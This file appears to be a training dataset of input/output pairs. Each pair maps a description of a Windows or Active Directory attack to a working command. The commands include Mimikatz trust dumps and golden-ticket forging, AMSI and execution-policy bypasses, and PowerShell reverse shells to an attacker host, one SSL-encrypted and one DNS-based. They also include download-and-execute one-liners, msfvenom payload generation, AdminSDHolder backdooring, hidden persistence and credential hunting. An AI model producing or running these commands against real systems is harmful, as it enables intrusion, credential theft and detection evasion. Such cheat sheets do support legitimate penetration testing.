{"input": "SID History Abuse You could also abuse SID History across a forest trust.  If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust.  As a reminder, you can get the signing key with", "output": "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"' -ComputerName dc.domain.local"}
{"input": "Encoded Command Execution, Executes a Base64-encoded PowerShell command, which can help bypass simple command-line logging and analysis tools.", "output": "$encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-Process')); powershell.exe -EncodedCommand $encodedCmd"}
{"input": "\"WTSImpersonator.exe,\"   launching an external executable with \\(-c flag\\), and specifying the command to be executed, which is opening the Command Prompt \"C:\\\\Windows\\\\System32\\\\cmd.exe\".", "output": ".\\WTSImpersonator.exe -m exec -s 3 -c C:\\Windows\\System32\\cmd.exe"}
{"input": "Abuse Organizations can check if the setting is enabled using the following `certutil.exe` command.", "output": "certutil -config \"CA_HOST\\CA_NAME\" -getreg \"policy\\EditFlags\""}
{"input": "Download the certificate with Certify", "output": "Certify.exe download /ca:dc.theshire.local\\theshire-DC-CA /id:336"}
{"input": "Get name of DC of the other domain", "output": "Get-DomainComputer -Domain domain.external -Properties DNSHostName"}
{"input": "Active User Credential Theft via Certificates. If the user is allowed to request a certificate that allows domain authentication, an attacker could request and steal it to maintain persistence.  The `User` template allows that and comes by default. However, it might be disabled. So, Certify allows you to find valid certificates to persist:", "output": "Certify.exe find /clientauth"}
{"input": "Get users inside \"Administrators\" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also", "output": "Get-NetGroupMember -Identity \"Administrators\" -Recurse"}
{"input": "Credentials user impersonation If you have valid credentials of any other user, you can create a new logon session with those credentials :", "output": "runas /user:domain\\username cmd.exe"}
{"input": "Get all descriptions", "output": "Get-NetUser -properties name , pwdlastset , logoncount , badpwdcount #Get all pwdlastset, logoncount and badpwdcount"}
{"input": "Find any machine accounts in privileged groups", "output": "Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ? { $_.MemberName -like '*$' }"}
{"input": "Access DB Dump an instance (a lotof CVSs generated in current dir)", "output": "Invoke-SQLDumpInfo -Verbose -Instance \"dcorp-mssql\""}
{"input": "ASREPRoastable and Kerberoastable users", "output": "Get-NetUser -PreauthNotRequired -SPN"}
{"input": "Find interesting ACLs", "output": "Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName , ObjectDN , ActiveDirectoryRights | fl"}
{"input": "Display information about the SNMP service configuration in the Windows Registry. This might include details such as service parameters, settings, and configurations related to SNMP.", "output": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s"}
{"input": "Get groups that can read passwords with LAPS enabled", "output": "Find-LAPSDelegatedGroups"}
{"input": "Privilege Checks, This command checks if a specific privilege is enabled. It's essential for verifying the operational status of a privilege before attempting actions that require it.", "output": "Test-NtTokenPrivilege SeChangeNotifyPrivilege"}
{"input": "Using PowerShell to Access WMI for Stealth, Leverages WMI (Windows Management Instrumentation) to execute system queries, which can be less conspicuous than direct PowerShell commands.", "output": "$query = 'SELECT * FROM Win32_Process'; Get-WmiObject -Query $query"}
{"input": "Mimikatz is intended to exploit the trust relationship in the Local Security Authority (LSA) and perform a dump of trust-related information. Specifically, the commands \"privilege::debug\" are used to enable debug privileges, followed by \"lsadump::trust /patch\" to exploit the trust relationships and potentially extract sensitive information.", "output": "Mimikatz \"privilege::debug\" \"lsadump::trust /patch\" exit"}
{"input": "Scheduled Task for Persistence, Creates a scheduled task to execute PowerShell commands, ensuring persistence and execution even after system reboots.", "output": "$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden Command \"YourCommand\"'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'MyTask' -Description 'MyDescription'"}
{"input": "Listen address ACLs, It will show a list of URL reservations on the system, including details such as the URL, the security identifier (SID) of the user or group associated with the reservation, and the permissions granted.", "output": "netsh http show urlacl"}
{"input": "Certutil It's possible to use certutil.exe lolbin (Microsoft-signed binary) to coerce NTLM authentication:", "output": "certutil.exe -syncwithWU  \\\\127.0.0.1\\share"}
{"input": "Force authentication from victim to compromised machine with port forwards", "output": "execute-assembly C:\\SpoolSample\\SpoolSample\\bin\\Debug\\SpoolSample.exe < victim> < compromised>"}
{"input": "Get usernames and their groups", "output": "Get-DomainUser -Properties name , MemberOf | fl"}
{"input": "Get info about the external forest (if possible)", "output": "Get-ForestGlobalCatalog -Forest external.domain ; Get-DomainTrust -SearchBase \"GC://$($ENV:USERDNSDOMAIN)\""}
{"input": "Get computers with LAPS enabled, expirations time and the password (if you have access)", "output": "Get-LAPSComputers"}
{"input": "Encrypted PowerShell Reverse Shell, Creates an encrypted reverse shell using SSL to secure the communication channel, making it more difficult for network security measures to inspect the traffic.", "output": "$ErrorActionPreference = 'SilentlyContinue'; $client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream, $false, {$true} ); $sslStream.AuthenticateAsClient('attacker_ip'); $writer = New-Object System.IO.StreamWriter($sslStream); $reader = New-Object System.IO.StreamReader($sslStream); while($true) { $writer.WriteLine('PS ' + (pwd).Path + '> '); $writer.Flush(); $command = $reader.ReadLine(); if($command -eq 'exit') { break; }; $output = iex $command 2>&1 | Out-String; $writer.WriteLine($output); $writer.Flush() }; $client.Close()"}
{"input": "Attack SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the \"old\" domain, the user's previous SID would be added to the SID History of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.  This can be achieved using either a Golden or Diamond Ticket. Find the SID of a group of the other domain (for example \"Domain Admins\") is with:", "output": "Get-DomainGroup -Identity \"Domain Admins\" -Domain parent.io -Properties ObjectSid"}
{"input": "Extract all backup Master Keys with Domain Admin A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:", "output": "lsadump::backupkeys /system:dc01.offense.local /export"}
{"input": "List installed antivirus (AV) products, Here's a simple PowerShell command to query Security Center and identify all installed Antivirus products on this computer:", "output": "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"}
{"input": "Check for LSASS WDigest caching, Using the following command we can check whether the WDigest credential caching is enabled on the system or not. This settings dictates whether we will be able to use Mimikatz to extract plaintext credentials from the LSASS process memory.", "output": "(gp registry::HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Wdigest).UseLogonCredential"}
{"input": "Downloading and Executing Scripts from URL, Downloads and executes a PowerShell script from a specified URL. Useful for executing remote payloads.", "output": "$url = 'http://example.com/script.ps1'; Invoke-Expression (New-Object Net.WebClient).DownloadString($url)"}
{"input": "Get root domain SID (this is the SID of the domain that has the trust relationship with the child domain)", "output": "lookupsid.py < child_domain>/username@10.10.10.10 | grep -B20 \"Enterprise Admins\" | grep \"Domain SID\""}
{"input": "Creating Reverse Shell, Establishes a reverse shell connection to a specified attacker-controlled machine, allowing remote command execution.", "output": "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535..."}
{"input": "Since the SYSVOL network shares are accessible to any authenticated domain user, we can easily identify if there are any stored credentials using the following command:", "output": "Push-Location \\\\\\\\example.com\\sysvol;gci * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password;Pop-Location"}
{"input": "Users that require a smart card to logon", "output": "Get-NetUser -UACFilter SMARTCARD_REQUIRED"}
{"input": "Accessing Physical Memory with Windows API, This PowerShell script uses the ReadProcessMemory function from the Windows API to read a specified amount of memory from a process. It's useful for extracting information from running processes.", "output": "Add-Type -TypeDefinition @\" using System; using System.Runtime.InteropServices; public class MemoryReader { [DllImport(\"kernel32.dll\")] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead); } \"@ $process = Get-Process -Name 'process_name' $handle = $process.Handle $buffer = New-Object byte[] 1024 $bytesRead = 0 [MemoryReader]::ReadProcessMemory($handle, [IntPtr]0x00000000, $buffer, $buffer.Length, [ref]$bytesRead)"}
{"input": "Finding Windows Servers on the domain Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:", "output": "Get-ADComputer -Filter {(OperatingSystem -like \"*windows*server*\") -and (OperatingSystem -notlike \"2016\") -and (Enabled -eq \"True\")} -Properties * | select Name | ft -HideTableHeaders > servers.txt"}
{"input": "Get usernames and their groups where name is like \"admin\"", "output": "Get-DomainGroup | where Name -like \"*Admin*\" | select samaccountname"}
{"input": "Get Forest info", "output": "Get-ForestDomain"}
{"input": "Locate web server configuration files, With this command, we can easily find configuration files belonging to Microsoft IIS, XAMPP, Apache, PHP or MySQL installation:", "output": "gci c:\\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue"}
{"input": "It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)", "output": "Invoke-UserHunter -Stealth"}
{"input": "Manual trusted link queery", "output": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query \"select * from openquery(\"\"sql2.domain.io\"\", 'select * from information_schema.tables')\""}
{"input": "Enumerate machines where a particular user/group identity has local admin rights", "output": "Get-DomainGPOUserLocalGroupMapping -Identity < User/Group>"}
{"input": "Modifying Token Privileges, Removing Privileges completely removes a privilege from a token, preventing its re-enabling.", "output": "Remove-NtTokenPrivilege"}
{"input": "SpoolSample.exe with the specified <TARGET> and <RESPONDERIP> as parameters, suggesting an attempt to exploit a print spooler vulnerability for lateral movement or privilege escalation in a Windows environment.", "output": "SpoolSample.exe <TARGET> <RESPONDERIP>"}
{"input": "Full way impersonating the user, Get a TGT from the current domain for the target domain for the user", "output": "Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap"}
{"input": "Extracting Saved RDP Credentials, Lists and deletes saved Remote Desktop Protocol (RDP) credentials, which can be used to access remote systems.", "output": "cmdkey /list | Select-String 'Target: TERMSRV' | ForEach-Object { cmdkey /delete:($_ -split ' ')[-1] }"}
{"input": "Search unconstrained delegation computers and show users", "output": "Find-DomainUserLocation -ComputerUnconstrained -ShowAll"}
{"input": "Get all domain trusts (parent, children and external)", "output": "Get-NetDomainTrust"}
{"input": "Bypassing AMSI (Anti-Malware Scan Interface), Bypasses the Anti-Malware Scan Interface (AMSI) in PowerShell, allowing the execution of potentially malicious scripts without detection.", "output": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,S tatic').SetValue($null,$true)"}
{"input": "ackdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse", "output": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All"}
{"input": "Users Filters, All disabled users", "output": "Get-NetUser -UACFilter ACCOUNTDISABLE"}
{"input": "Get active sessions on the host", "output": "Get-NetSession -ComputerName < servername>"}
{"input": "Find database credentials in configuration files, Using the following PowerShell command we can find database connection strings (with plaintext credentials) stored in various configuration files such as web.config for ASP.NET configuration, in Visual Studio project files etc.:", "output": "gci c:\\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern \"connectionString\""}
{"input": "Search account with \"something\" in a parameter", "output": "Find-UserField -SearchField Description -SearchTerm \"built\""}
{"input": "DNS-Based PowerShell Reverse Shell, This script uses DNS requests to exfiltrate data, making the reverse shell traffic appear as DNS queries, which can be less suspicious and harder to detect.", "output": "function Invoke-DNSReverseShell { param([string]$attacker_ip, [int]$attacker_port) $client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); nslookup $encodedSendback $attacker_ip; $stream.Flush()}; $client.Close() }"}
{"input": "Port scan a network for a single port (port-sweep) with PowerShell TcpClient, This could be useful for example for quickly discovering SSH interfaces (port tcp/22) on a specified network Class C subnet (10.10.0.0/24):", "output": "$port = 22;$net = \"10.10.0.\";0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) \"Port $port is open on $net$_\"} 2>$null"}
{"input": "After we are done with our business, remove the rule in the Windows firewall:", "output": "Remove-NetFirewallRule -DisplayName \"pentest\""}
{"input": "Retrieving Passwords from Unsecured Files, Searches for the term `password' in all text files within the Documents folders of all users, which can reveal passwords stored insecurely.", "output": "Select-String -Path C:\\Users\\*\\Documents\\*.txt -Pattern 'password' -CaseSensitive"}
{"input": "Here's a useful command to whitelist an IP address in the Windows firewall, after this we should be able to connect to this host from our IP address (10.10.15.123) on every port:", "output": "New-NetFirewallRule -Action Allow -DisplayName \"pentest\" -RemoteAddress 10.10.15.123"}
{"input": "Get all ifo of specific domain Domain Controller", "output": "Get-NetDomainController -Domain mydomain.local"}
{"input": "Check for possible vulnerabilities on an instance where you have access", "output": "Invoke-SQLAudit -Verbose -Instance \"dcorp-mssql.dollarcorp.moneycorp.local\""}
{"input": "Bypassing common detections The most frequent ways to detect a golden ticket are by inspecting Kerberos traffic on the wire.  By default, Mimikatz signs the TGT for 10 years, which will stand out as anomalous in subsequent TGS requests made with it.  Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).", "output": "Get-DomainPolicy | select -expand KerberosPolicy"}
{"input": "Meterpreter Get rev shell (x64), generate a payload with the intent of establishing a reverse TCP shell on a target system.", "output": "msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll"}
{"input": "Bypassing Script Execution Policy, Temporarily changes the script execution policy to allow the running of unauthorized scripts, then reverts it back to its original setting.", "output": "$policy = Get-ExecutionPolicy; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; # Run your script here; Set-ExecutionPolicy -ExecutionPolicy $policy -Scope Process"}
{"input": "Windows API for Clipboard Access, This script demonstrates how to access and manipulate the Windows clipboard using API calls. It can be used to read or modify clipboard contents for information gathering or data manipulation.", "output": "Add-Type -TypeDefinition @\" using System; using System.Runtime.InteropServices; using System.Text; public class ClipboardAPI { [DllImport(\"user32.dll\")] public static extern bool OpenClipboard(IntPtr hWndNewOwner); [DllImport(\"user32.dll\")] public static extern bool CloseClipboard(); [DllImport(\"user32.dll\")] public static extern IntPtr GetClipboardData(uint uFormat); [DllImport(\"kernel32.dll\")] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport(\"kernel32.dll\")] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport(\"kernel32.dll\")] public static extern int GlobalSize(IntPtr hMem); } \"@ [ClipboardAPI]::OpenClipboard([IntPtr]::Zero) $clipboardData = [ClipboardAPI]::GetClipboardData(13) CF_TEXT format $gLock = [ClipboardAPI]::GlobalLock($clipboardData) $size = [ClipboardAPI]::GlobalSize($clipboardData) $buffer = New-Object byte[] $size [System.Runtime.InteropServices.Marshal]::Copy($gLock, $buffer, 0, $size) [ClipboardAPI]::GlobalUnlock($gLock) [ClipboardAPI]::CloseClipboard() [System.Text.Encoding]::Default.GetString($buffer)"}
{"input": "Reverse shell: uninstall a .NET assembly (psby.exe) using InstallUtil.exe while simultaneously attempting to establish a reverse shell connection to the IP address 10.10.13.206 on port 443, with logging to the console enabled.", "output": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\\temp\\psby.exe"}
{"input": "Search for SNMP community string in registry, Finding a SNMP community string is not a critical issue, but it could be useful to Understand what kind of password patterns are used among sysadmins in the organization, The following command will extract SNMP community string stored in the registry, if there is any:", "output": "gci HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse -EA SilentlyContinue"}
{"input": "Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)", "output": "Get-NetForestTrust"}
{"input": "Manipulating Windows Services via API, This script uses Windows API calls to interact with Windows services, such as creating, starting, or modifying them. This can be used for persistence or privilege escalation.", "output": "Add-Type -TypeDefinition @\" using System; using System.Runtime.InteropServices; public class ServiceManager { [DllImport(\"advapi32.dll\", SetLastError = true)] public static extern IntPtr OpenSCManager(string lpMachineName, string lpSCDB, int scParameter); [DllImport(\"advapi32.dll\", SetLastError = true)] public static extern IntPtr CreateService(IntPtr SC_HANDLE, string lpSvcName, string lpDisplayName, int dwDesiredAccess, int dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lp, string lpPassword); [DllImport(\"advapi32.dll\", SetLastError = true)] public static extern bool StartService(IntPtr SVHANDLE, int dwNumServiceArgs, string lpServiceArgVectors); } \"@ $scManagerHandle = [ServiceManager]::OpenSCManager(null, null, 0xF003F) # Further code to create, modify, or start services goes here"}
{"input": "Get info about a user", "output": "Get-NetUser -UserName student107"}
{"input": "Mimikatz tool to perform a Kerberos Golden Ticket attack.Generate a forged Kerberos ticket for the Administrator user in the specified domain (\"rd.lab.adsecurity.org\"). It specifies various parameters such as the user ID, security identifier (SID), key, group information, and ticket lifetime. After executing the Mimikatz command, it exits, potentially to avoid leaving traces or to conclude the operation.", "output": ".\\mimikatz \"kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" exit"}
{"input": "Conducting Network Sniffing, Sets up a network capture session to sniff packets, which can be analyzed for sensitive data or network troubleshooting.", "output": "$adapter = Get-NetAdapter | Select-Object -First 1; New-NetEventSession -Name 'Session1' -CaptureMode SaveToFile -LocalFilePath 'C:\\temp\\network_capture.etl'; Add-NetEventPacketCaptureProvider -SessionName 'Session1' -Level 4 -CaptureType Both -Enable; Start-NetEventSession -Name 'Session1'; StopNetEventSession -Name 'Session1' after 60"}
{"input": "Get locally logon users at the moment (need remote registry (default in server OS))", "output": "Get-LoggedOnLocal -ComputerName < servername>"}
{"input": "Retrieving Credentials from Database Connection Strings, Scans for database connection strings in web application configuration files, which often contain credentials for database access.", "output": "Select-String -Path C:\\inetpub\\wwwroot\\*.config -Pattern 'connectionString' -CaseSensitive"}
{"input": "Basic user enabled info", "output": "Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname , description , pwdlastset , logoncount , badpwdcount"}
{"input": "To stop a guest SMB shared drive, (This could come handy for transferring files, exfiltration etc.) execute:", "output": "Remove-SmbShare -Name \"sharedir\" -Force"}
{"input": "Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.", "output": "Invoke-UserHunter -CheckAccess"}
